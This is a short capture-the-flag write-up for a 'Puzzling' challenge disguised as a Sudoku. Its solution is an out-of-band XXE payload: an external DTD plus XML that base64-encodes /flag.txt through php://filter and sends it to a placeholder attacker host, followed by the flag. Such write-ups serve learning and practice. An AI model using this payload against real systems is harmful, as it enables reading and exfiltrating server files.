# Puzzling

Solved by: @yappare

## Question:
Everybody needs a little break from hacking from time to time. Why not enjoy this simple Sudoku puzzle? Surely it's not hiding anything else...right?


## Solution:
`external.dtd`
```
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://our-host or collab/dtd.xml?%data;'>"> %eval;
```
payload
```
<?xml version="1.0" ?>
<!DOCTYPE r [
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
 <!ENTITY % oob SYSTEM "http://our-host-where-external-dtd-is/external.dtd">
 %oob;
]> 
<root> &exfil; </root>
```

**Flag:** `sun{4_gr1d_full_0f_3nt1ti3s}`
